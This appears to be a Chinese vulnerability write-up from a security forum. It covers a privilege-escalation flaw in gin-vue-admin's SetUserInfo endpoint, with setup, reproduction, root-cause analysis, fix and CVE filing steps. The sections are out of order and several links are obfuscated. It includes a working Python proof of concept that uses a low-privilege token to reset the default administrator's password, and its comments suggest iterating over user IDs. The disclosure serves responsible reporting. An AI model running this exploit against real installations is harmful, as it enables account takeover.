
![image-20220104131901466](upload/attach/202201/809626\_QHGKT8DSYC4WND2.jpg)

但是在`setuserinfo`使用的`ID`却是用户的账号`ID`

![image-20220104132137472](upload/attach/202201/809626\_WU8WSDCQW4RSJQ7.jpg)

所以就导致了越权，因为这个`ID`可以前端传入的时候可以控制，并且也已经鉴权之后了，在与作者沟通之后，解释说修复也比较简单，只需要将`user.id`强制赋值为`JWT`所对应的权限`ID`即可，这样就不会造成越权了，因为前端怎么传入，最终在代码中还是有一行会将`user.id`的值修改为当前`JWT`所对应的`id`

但是在业务流程逻辑中，这些权限又是必须给的，因为不给的话，当前用户是没有办法修改自己的信息的

![image-20220104135624752](upload/attach/202201/809626\_BXHQBWRYXZQFEZB.jpg)

### 五、POC编写

```python
#!/usr/bin/env python
# -\*- coding: UTF-8 -\*-
'''
@Project ：UzJuSecurityTools
@File ：Gin-Vue-Admin-Poc.py
@Author ：UzJu
@Date ：2021/12/31 11:20
@Email ：UzJuer@163.com
'''
import requests
import json
import sys

class GinVueAdminPoc:
    def __init__(self, url, token):
        self.url = url
        self.jwt_token = token
        '''
        define vuln interface
        '''
        # Method PUT Severity High
        self.setUserInfo = "/api/user/setUserInfo"
        # Method POST Severity Moderate
        self.changePassword = "/api/user/changePassword"

    def checkVuln(self):
        '''
        因为默认管理员的用户ID为1，所以，这里直接修改ID为1的用户账号为admin，密码为qwe@123
        在实际使用中，可以通过遍历ID，来判断哪个ID用户存在，不过默认用户在实战中应该都是存在的
        The default user ID of the administrator is 1. Therefore, change the account of user 1 to admin and the password to qwe@123
        In practice, you can check which ID exists by iterating through the ID, but the default user should exist in practice
        '''
        payload_data = {
            "id": 1,
            "username": "admin",
            "nickName": "超级管理员",
            "Password": "qwe@123"
        }
        # Change the administrator password to qwe@123, because the default administrator ID is 1
        headers = {
            "x-token": self.jwt_token
        }
        result = requests.put(url=self.url + self.setUserInfo,
                              headers=headers,
                              data=json.dumps(payload_data)
                              )
        if json.loads(result.content)['code'] == 7:
            print("[-]Modify the failure")
        elif json.loads(result.content)['code'] == 0:
            print(f"[+]Modify the success, Account: {payload_data['username']}, password: {payload_data['Password']}")

    def check_interface_ChangePassword(self):
        '''
        wait
        '''
        pass

if __name__ == '__main__':
    try:
        Banner_2 = '''
/$$   /$$ /$$$$$$
| $$  | $$ |__  $$
| $$  | $$ /$$$$$$$$   | $$ /$$ /$$
| $$  | $$|____ /$$/   | $$| $$ | $$
| $$  | $$ /$$$$/ /$$   | $$| $$ | $$
| $$  | $$ /$$__/  | $$   | $$| $$ | $$
| $$$$$$/ /$$$$$$$$| $$$$$$/| $$$$$$/
\_______/ |________/ \______/  \______/
Autor: UzJu Email: UzJuer@163.com GitHub: github.com/uzju
'''
        print(Banner_2)
        url = sys.argv[1]
        jwt_token = sys.argv[2]
        main = GinVueAdminPoc(url, jwt_token)
        main.checkVuln()
    except:
        print("[-]please input url and token")
```

为什么`check_interface_ChangePassword`这个方法没写是因为，这里算是一个暴力破解的一个接口，因为在修改任意用户的密码之前，必须知道需要修改的那个账号的密码，这就像是暴力破解，所以这里并没有写，然后就是`checkvuln`这个方法，`payload_data`这个`json`数据中的`id`，其实可以任意更改的，也可以写成`for`循环进行遍历，因为在实际环境中并不确定管理员的`ID`是否为`1`，或者说存在恶意破坏的话，也可以造成一定的影响。

![image-20211231143107127](upload/attach/202201/809626\_ZQJSKUUAB5VNXS7.jpg)

### 六、CVE申请

> CNVD的就不用说了吧，肯定也已经提交了，这里申请CVE的。

>

> GitHub代申请编号来的特别快，基本上最多3天，这里是当天提交的次日凌晨就收到了CVE的预分配编号

>

> 以下操作需要联系作者帮你操作，不然没有`New Draft security advisory`这个按钮

![image-20220107164730550](upload/attach/202201/809626\_MJ3CC2QKCS47V45.jpg)

![image-20220107165445797](upload/attach/202201/809626\_VZPB63EMBT294KC.jpg)

![image-20220107165519396](upload/attach/202201/809626\_WRUWM4WYXCHZA9S.jpg)

`Description`写上漏洞的内容，复现过程，`POC`就行，然后点击`create draft security advisory`

**由于当时我们是第一次申请这个，犯了一个错误，只列出了一个草稿，并没有请求，导致我们白白等了7天**

![image-20220107165651894](upload/attach/202201/809626\_JBE6WZ38AHY69SP.jpg)

写完了一定要拉到下面，去点击`request cve id`

![image-20220107165714011](upload/attach/202201/809626\_XV2MR8U2ZW4GKR5.jpg)

![image-20220107165744293](upload/attach/202201/809626\_U9DCWD94VJ3WQXT.jpg)

> 参考文章：<mark class="encrypted">f09K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8X3g2s2K9V1c8&6x3U0m8#2L8W2N6Q4x3X3c8X3g2r3W2#2f1@1!0a6f1r3N6d9k6H3`.`.</mark>

### 七、致谢

+ 作者团队主页：<mark class="encrypted">960K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3L8r3W2H3M7r3g2V1i4K6u0V1j5i4g2J5L8%4u0S2i4K6u0r3</mark>

+ 作者的GitHub：<mark class="encrypted">d3aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6H3K9h3g2^5L8r3#2S2P5l9`.`.</mark>

+ Gin-vue-admin项目地址：<mark class="encrypted">8c6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3L8r3W2H3M7r3g2V1i4K6u0V1j5i4g2J5L8%4u0S2i4K6u0r3k6$3W2F1i4K6u0V1N6Y4g2W2i4K6u0V1j5h3c8E0K9h3^5`.</mark>

目录

- [一、前言](https://bbs.kanxue.com/#一、前言)
- [二、环境搭建](https://bbs.kanxue.com/#二、环境搭建)
- [三、漏洞复现](https://bbs.kanxue.com/#三、漏洞复现)
  - [SetUserInfo存在垂直越权](https://bbs.kanxue.com/#setuserinfo存在垂直越权)
    - [1、SetUserInfo接口越权设置用户个人信息](https://bbs.kanxue.com/#1、setuserinfo接口越权设置用户个人信息)
    - [2、SetUserInfo接口垂直越权无条件修改管理员密码](https://bbs.kanxue.com/#2、setuserinfo接口垂直越权无条件修改管理员密码)
    - [3、越权修改用户密码](https://bbs.kanxue.com/#3、越权修改用户密码)
- [四、漏洞原理分析](https://bbs.kanxue.com/#四、漏洞原理分析)
- [五、POC编写](https://bbs.kanxue.com/#五、poc编写)
- [六、CVE申请](https://bbs.kanxue.com/#六、cve申请)
- [七、致谢](https://bbs.kanxue.com/#七、致谢)

### 一、前言

欢迎各位大佬们给该项目点一个`start`

| 1 | `https://github.com/flipped-aurora/gin-vue-admin/` |
| --- | --- |

![image-20211230151736779](https://bbs.kanxue.com/upload/attach/202201/809626_YZ2UHAFJCEUVTGZ.jpg)

文章写完了之后，申请CVE有一些麻烦，不过好在还是申请到了，github的员工响应迅速

> ps 申请CVE前，已经提交了CNVD

![image-20220107161655217](https://bbs.kanxue.com/upload/attach/202201/809626_4SGKKP862UWSTJF.jpg)

### 二、环境搭建

按照官方教程

| 1 | `git clone https://github.com/flipped-aurora/gin-vue-admin.git` |
| --- | --- |

随后进入`server`目录

| 1 | `go generate` |
| --- | --- |

![image-20211230134341075](https://bbs.kanxue.com/upload/attach/202201/809626_473FDBTG54JN8NY.jpg)

| 1 | `go build -o server main.go` |
| --- | --- |

随后直接运行`server`即可

![image-20211230134411233](https://bbs.kanxue.com/upload/attach/202201/809626_UT6285UHSVPK3HA.jpg)

随后是WEB，进入到`web`目录，输入

| 1 | `cnpm install || npm install` |
| --- | --- |

随后等待即可

![image-20211230134632959](https://bbs.kanxue.com/upload/attach/202201/809626_55C3GHZ4JHXHJJE.jpg)

随后安装完成会自动打开WEB网页

![image-20211230135126848](https://bbs.kanxue.com/upload/attach/202201/809626_ZU54JE68ZUDVUFD.jpg)

![image-20211230135135212](https://bbs.kanxue.com/upload/attach/202201/809626_4XVZ9RC44KU9VCF.jpg)

随后初始化设置数据库信息

![image-20211230135407388](https://bbs.kanxue.com/upload/attach/202201/809626_PB4KTNG8TYKFX3W.jpg)

配置好之后点击初始化后登录即可

![image-20211230135437587](https://bbs.kanxue.com/upload/attach/202201/809626_QYZ5BKTBCZ9YZ2M.jpg)

### 三、漏洞复现

### SetUserInfo存在垂直越权

##### 1、SetUserInfo接口越权设置用户个人信息

我们直接来到用户管理页面，新增一个低权限的用户角色

![image-20211230143853535](https://bbs.kanxue.com/upload/attach/202201/809626_Z3EW39G5YM97DUW.jpg)

可以看到上方并没有给到管理员的权限，接下来新建一个账号，分给这个角色组

![image-20211230144026344](https://bbs.kanxue.com/upload/attach/202201/809626_6MW4EMKWB4C99ZJ.jpg)

![image-20211230144005936](https://bbs.kanxue.com/upload/attach/202201/809626_ZPXAKNZPTVMENPD.jpg)

漏洞发生的位置在`232K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3L8r3W2H3M7r3g2V1i4K6u0V1j5i4g2J5L8%4u0S2i4K6u0r3k6$3W2F1i4K6u0V1N6Y4g2W2i4K6u0V1j5h3c8E0K9h3&6Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3M7$3g2J5N6X3g2J5i4K6u0r3j5i4m8A6i4K6u0r3N6U0q4Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1k6K6P5i4y4Q4y4h3k6#2M7$3g2J5i4K6u0W2k6$3!0Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0N6Q4b7f1y4Q4b7f1x3J5y4K6y4Q4c8e0S2Q4b7e0q4Q4z5p5x3`.

![image-20211230141604735](https://bbs.kanxue.com/upload/attach/202201/809626_TG3KVEDCFT546MZ.jpg)

